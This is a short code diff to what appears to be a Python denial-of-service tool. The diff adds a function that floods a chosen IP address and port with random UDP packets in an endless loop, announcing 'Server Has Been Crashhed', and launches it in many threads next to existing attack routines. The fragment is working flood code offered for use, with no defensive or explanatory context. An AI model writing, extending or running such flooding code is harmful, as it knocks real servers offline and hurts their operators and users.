@@ -169,9 +169,21 @@ def xxx():
 		except:
 			print("Server Has Been Maintenace")
 
+def xzx():
+	data = random._urandom(1000)
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print("Server Has Been Crashhed")
+		except:
+			print("Server Has Been Maintenace")
 
 for _o in range(threads):
 	threading.Thread(target=xxx).start()
+	threading.Thread(target=xzx).start()
 	threading.Thread(target=attackx).start()
 
 for _i in range(threads):
